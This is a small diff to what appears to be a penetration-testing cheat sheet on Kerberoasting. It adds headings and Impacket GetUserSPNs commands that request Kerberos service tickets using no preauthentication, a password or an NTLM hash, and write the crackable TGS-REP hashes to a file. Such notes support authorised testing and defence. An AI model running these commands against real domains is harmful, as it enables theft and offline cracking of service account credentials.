@@ -3,11 +3,15 @@ This attack targets [Service Principal Names (SPN)](https://docs.microsoft.com/
 ## **Perform Kerberoasting on `Kali`:**
 
 **Command Syntax**: Use the following command to request the **TGS** (Ticket Granting Server) and capture the TGS-REP hash:
-    
+#### Kerberoast without preauthentication   
 ```bash
 impacket-GetUserSPNs -request -dc-ip <DomainController_IP>  -outputfile <output_file> <Domain/User>
 ```
-Using a Hash from a user 
+#### with a password
+```
+GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
+```
+#### Using a Hash from a user 
 ```
 GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
 ```
